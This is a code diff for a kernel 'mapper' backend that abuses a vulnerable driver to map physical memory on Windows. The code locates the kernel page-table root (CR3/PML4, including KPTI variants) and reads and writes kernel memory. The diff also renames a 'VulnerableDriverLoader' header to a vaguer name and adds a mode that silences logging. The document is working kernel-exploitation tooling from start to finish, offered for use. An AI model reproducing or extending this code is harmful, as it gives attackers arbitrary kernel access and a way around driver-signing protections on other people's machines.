@@ -3,7 +3,7 @@
 #if defined(KZEROMAPPER_ENABLE_PPA64)
 
 #include "PPA64Backend.h"
-#include "../Common/VulnerableDriverLoader.h"
+#include "../Common/vDriverLoader.h"
 #include "ppa_x64_sys.h"
 #include "../DirectIO64/halamd64.h"
 #include <algorithm>
@@ -104,6 +104,13 @@ namespace
 			return false;
 		}
 	}
+
+	struct QuietGuard
+	{
+		bool& m_Flag;
+		explicit QuietGuard( bool& flag ) : m_Flag( flag ) { m_Flag = true; }
+		~QuietGuard( ) { m_Flag = false; }
+	};
 }
 
 std::string PPA64Backend::Name( ) const
@@ -113,18 +120,9 @@ std::string PPA64Backend::Name( ) const
 
 NTSTATUS PPA64Backend::Load( )
 {
-	const auto status = KernelRwCallBackend::Load( );
+	m_CallGate = KernelCallGate::NtQueryAtom;
 
-	if ( status != STATUS_SUCCESS )
-		return status;
-
-	if ( !m_NtUserSetGestureConfigRef )
-	{
-		LOG_SEC( "[-] - [PPA64] NtUserSetGestureConfig_ref not found" );
-		return 0x9170;
-	}
-
-	return STATUS_SUCCESS;
+	return KernelRwCallBackend::Load( );
 }
 
 NTSTATUS PPA64Backend::LoadDevice( )
@@ -148,6 +146,13 @@ bool PPA64Backend::MapPhysical( uint64_t physicalAddress, uint32_t size, uint64_
 
 	*virtualAddress = 0;
 
+	if ( ( physicalAddress & ~PhysicalAddressMask ) != 0 )
+	{
+		if ( !m_QuietMode )
+			LOG_SEC( "[-] - [PPA64] MapPhysical rejected bogus pa=0x%llx size=0x%X", physicalAddress, size );
+		return false;
+	}
+
 	MapPhysicalRequest request {};
 	request.PhysicalAddress = physicalAddress;
 	request.Size = size;
@@ -155,9 +160,24 @@ bool PPA64Backend::MapPhysical( uint64_t physicalAddress, uint32_t size, uint64_
 	uint64_t mappedVa = 0;
 	DWORD bytesReturned = 0;
 
-	if ( !DeviceIoControl( m_Device, Ppa64MapPhysicalIoctl, &request, sizeof( request ), &mappedVa, sizeof( mappedVa ), &bytesReturned, nullptr ) )
+	bool mapped = false;
+	DWORD gle = 0;
+
+	const int maxAttempts = m_QuietMode ? 1 : 10;
+
+	for ( int attempt = 0; attempt < maxAttempts && !mapped; ++attempt )
 	{
-		LOG_SEC( "[-] - [PPA64] MapPhysical failed pa=0x%llx size=0x%X gle=%lu", physicalAddress, size, GetLastError( ) );
+		if ( attempt > 0 )
+			Sleep( 20 );
+
+		mapped = DeviceIoControl( m_Device, Ppa64MapPhysicalIoctl, &request, sizeof( request ), &mappedVa, sizeof( mappedVa ), &bytesReturned, nullptr ) != FALSE;
+		gle = GetLastError( );
+	}
+
+	if ( !mapped )
+	{
+		if ( !m_QuietMode )
+			LOG_SEC( "[-] - [PPA64] MapPhysical failed pa=0x%llx size=0x%X gle=%lu", physicalAddress, size, gle );
 		return false;
 	}
 
@@ -214,30 +234,66 @@ bool PPA64Backend::ReadWritePhysical( uint64_t physicalAddress, void* buffer, ui
 	return result;
 }
 
-	bool PPA64Backend::QueryPml4( uint64_t* value )
-{
-	if ( !value )
-		return false;
-
-	*value = 0;
-
-	const ULONG mapSize = 0x1000000;
-	uint64_t mappedVa = 0;
-
-	if ( !MapPhysical( 0, mapSize, &mappedVa ) )
+	bool PPA64Backend::ValidateCr3WithNtoskrnl( uint64_t cr3 )
 	{
-		LOG_SEC( "[-] - [PPA64] QueryPml4 failed to map low 16MB gle=%lu", GetLastError( ) );
-		return false;
+		if ( !m_Ntoskrnl )
+			return false;
+
+		uint64_t testPa = 0;
+		if ( !VirtualToPhysicalWithCr3( cr3, m_Ntoskrnl, &testPa ) )
+			return false;
+
+		if ( testPa == 0 || testPa >= 0x10000000000ull )
+			return false;
+
+		uint16_t mz = 0;
+		if ( !ReadWritePhysical( testPa, &mz, sizeof( mz ), false ) )
+			return false;
+
+		return mz == 0x5A4D;
 	}
 
+	bool PPA64Backend::QueryPml4( uint64_t* value )
+	{
+		if ( !value )
+			return false;
+
+		if ( m_Pml4Cache )
+		{
+			*value = m_Pml4Cache;
+			return true;
+		}
+
+		*value = 0;
+
+	// MmMapIoSpace-based driver exhausts system resources on large maps (ERROR_NO_SYSTEM_RESOURCES);
+	// read the low memory in 4KB chunks — the size proven stable by the table walk cycles.
+	const ULONG mapSize = 0x1000000;
+	const ULONG chunkSize = 0x1000;
 	std::vector<uint8_t> lowMemory( mapSize );
 
-	bool readOk = SafeMemcpy( lowMemory.data( ), r_cast<const void*>( mappedVa ), mapSize );
+	bool readOk = true;
 
-	if ( !readOk )
-		LOG_SEC( "[-] - [PPA64] QueryPml4 exception reading mapped low memory", 0 );
+	for ( ULONG chunkOffset = 0; chunkOffset < mapSize && readOk; chunkOffset += chunkSize )
+	{
+		uint64_t mappedVa = 0;
+		const auto currentChunk = std::min<ULONG>( chunkSize, mapSize - chunkOffset );
 
-	UnmapPhysical( mappedVa, mapSize );
+		if ( !MapPhysical( chunkOffset, currentChunk, &mappedVa ) )
+		{
+			LOG_SEC( "[-] - [PPA64] QueryPml4 failed to map low chunk pa=0x%llx size=0x%X gle=%lu", chunkOffset, currentChunk, GetLastError( ) );
+			readOk = false;
+			break;
+		}
+
+		if ( !SafeMemcpy( lowMemory.data( ) + chunkOffset, r_cast<const void*>( mappedVa ), currentChunk ) )
+		{
+			LOG_SEC( "[-] - [PPA64] QueryPml4 exception reading mapped chunk pa=0x%llx", chunkOffset );
+			readOk = false;
+		}
+
+		UnmapPhysical( mappedVa, currentChunk );
+	}
 
 	if ( !readOk )
 		return false;
@@ -246,12 +302,46 @@ bool PPA64Backend::ReadWritePhysical( uint64_t physicalAddress, void* buffer, ui
 
 	if ( stubOffset != 0xFFFFFFFF )
 	{
-		*value = ReadPml4FromLowStub( lowMemory.data( ), stubOffset );
-		LOG_SEC( "[*] - [PPA64] QueryPml4 found pml4=0x%llx lowStubOffset=0x%X", *value, stubOffset );
-		return true;
+		const auto rawCr3 = ReadPml4FromLowStub( lowMemory.data( ), stubOffset );
+
+		if ( ValidateCr3WithNtoskrnl( rawCr3 ) )
+		{
+			m_Pml4Cache = rawCr3;
+			*value = rawCr3;
+			LOG_SEC( "[*] - [PPA64] QueryPml4 validated pml4=0x%llx", *value );
+			return true;
+		}
+
+		const auto cr3Pa = rawCr3 & PhysicalAddressMask;
+		const auto pcid = rawCr3 & 0xFFFull;
+
+		const uint64_t kptiCandidates[ 5 ] = {
+			( cr3Pa + 0x1000 ) | pcid,
+			( cr3Pa + 0x1000 ),
+			( cr3Pa - 0x1000 ) | pcid,
+			( cr3Pa - 0x1000 ),
+			( cr3Pa + 0x1000 ) | ( pcid ^ 0x1000 ),
+		};
+
+		for ( int i = 0; i < 5; ++i )
+		{
+			if ( kptiCandidates[ i ] == rawCr3 )
+				continue;
+
+			if ( ValidateCr3WithNtoskrnl( kptiCandidates[ i ] ) )
+			{
+				m_Pml4Cache = kptiCandidates[ i ];
+				*value = kptiCandidates[ i ];
+				LOG_SEC( "[*] - [PPA64] QueryPml4 KPTI kernel cr3=0x%llx (variant %d, user=0x%llx)",
+					*value, i, rawCr3 );
+				return true;
+			}
+		}
+
+		LOG_SEC( "[-] - [PPA64] Low stub CR3 and KPTI variants all failed validation", 0 );
 	}
 
-	LOG_SEC( "[*] - [PPA64] Low stub scan failed, scanning low 1MB for CR3 candidates", 0 );
+	LOG_SEC( "[*] - [PPA64] Scanning low 16MB for CR3 candidates", 0 );
 
 	const uint64_t validationVa = m_Ntoskrnl;
 	if ( !validationVa )
@@ -265,43 +355,48 @@ bool PPA64Backend::ReadWritePhysical( uint64_t physicalAddress, void* buffer, ui
 	const size_t qwordCount = mapSize / sizeof( uint64_t );
 
 	ULONG tested = 0;
-	for ( size_t i = 0; i < qwordCount; ++i )
 	{
-		const auto candidate = p[ i ];
+		QuietGuard guard( m_QuietMode );
 
-		if ( candidate == 0 || candidate == 0xFFFFFFFFFFFFFFFFull )
-			continue;
+		for ( size_t i = 0; i < qwordCount; ++i )
+		{
+			const auto candidate = p[ i ];
 
-		if ( ( candidate >> 52 ) != 0 )
-			continue;
+			if ( candidate == 0 || candidate == 0xFFFFFFFFFFFFFFFFull )
+				continue;
 
-		const auto candidatePa = candidate & PhysicalAddressMask;
-		if ( !candidatePa || candidatePa >= maxValidPa )
-			continue;
+			if ( ( candidate >> 52 ) != 0 )
+				continue;
 
-		if ( candidatePa == 0 || candidatePa < 0x1000 )
-			continue;
+			const auto candidatePa = candidate & PhysicalAddressMask;
+			if ( !candidatePa || candidatePa >= maxValidPa )
+				continue;
 
-		uint64_t testPa = 0;
-		if ( !VirtualToPhysicalWithCr3( candidate, validationVa, &testPa ) )
-			continue;
+			if ( candidatePa == 0 || candidatePa < 0x1000 )
+				continue;
 
-		++tested;
+			uint64_t testPa = 0;
+			if ( !VirtualToPhysicalWithCr3( candidate, validationVa, &testPa ) )
+				continue;
 
-		if ( testPa == 0 || testPa >= maxValidPa )
-			continue;
+			++tested;
 
-		uint16_t mz = 0;
-		if ( !ReadWritePhysical( testPa, &mz, sizeof( mz ), false ) )
-			continue;
+			if ( testPa == 0 || testPa >= maxValidPa )
+				continue;
 
-		if ( mz != 0x5A4D )
-			continue;
+			uint16_t mz = 0;
+			if ( !ReadWritePhysical( testPa, &mz, sizeof( mz ), false ) )
+				continue;
 
-		*value = candidate;
-		LOG_SEC( "[*] - [PPA64] QueryPml4 found pml4=0x%llx at offset=0x%llx (testPa=0x%llx mz=0x%X tested=%lu)",
-			*value, i * 8, testPa, mz, tested );
-		return true;
+			if ( mz != 0x5A4D )
+				continue;
+
+			m_Pml4Cache = candidate;
+			*value = candidate;
+			LOG_SEC( "[*] - [PPA64] QueryPml4 found pml4=0x%llx at offset=0x%llx (testPa=0x%llx mz=0x%X tested=%lu)",
+				*value, i * 8, testPa, mz, tested );
+			return true;
+		}
 	}
 
 	LOG_SEC( "[-] - [PPA64] QueryPml4 failed to find PML4 (tested=%lu candidates)", tested );
@@ -381,7 +476,6 @@ bool PPA64Backend::VirtualToPhysicalByTableWalk( uint64_t virtualAddress, uint64
 		return false;
 	}
 
-	LOG_SEC( "[*] - [PPA64] VirtualToPhysicalByTableWalk va=0x%llx pa=0x%llx pml4=0x%llx", virtualAddress, *physicalAddress, pml4 );
 	return true;
 }
 
@@ -411,12 +505,41 @@ bool PPA64Backend::ReadWriteVirtual( uint64_t address, void* buffer, size_t size
 
 bool PPA64Backend::ReadMemory( uint64_t address, void* buffer, size_t size )
 {
-	const auto result = ReadWriteVirtual( address, buffer, size, false );
+	// Session-space drivers (win32kfull etc.) have pageable regions; a PTE with
+	// present=0 means the page is paged out. Zero-fill those and retry later
+	// instead of failing the whole read.
+	auto bytes = r_cast<uint8_t*>( buffer );
 
-	if ( !result )
-		LOG_SEC( "[-] - [PPA64] ReadMemory failed va=0x%llx size=0x%llx", address, size );
+	for ( int attempt = 0; attempt < 3; ++attempt )
+	{
+		if ( attempt > 0 )
+			Sleep( 200 );
 
-	return result;
+		size_t offset = 0;
+		size_t failed = 0;
+
+		while ( offset < size )
+		{
+			const auto currentAddress = address + offset;
+			const auto pageLeft = 0x1000 - ( currentAddress & 0xFFF );
+			const auto chunk = s_cast<uint32_t>( std::min<size_t>( pageLeft, size - offset ) );
+
+			if ( !ReadWriteVirtual( currentAddress, bytes + offset, chunk, false ) )
+			{
+				memset( bytes + offset, 0, chunk );
+				++failed;
+			}
+
+			offset += chunk;
+		}
+
+		if ( failed == 0 )
+			return true;
+
+		LOG_SEC( "[*] - [PPA64] ReadMemory %zu/%zu pages paged out va=0x%llx (attempt %d)", failed, ( size + 0xFFF ) / 0x1000, address, attempt + 1 );
+	}
+
+	return false;
 }
 
 bool PPA64Backend::WriteMemory( uint64_t address, const void* buffer, size_t size )
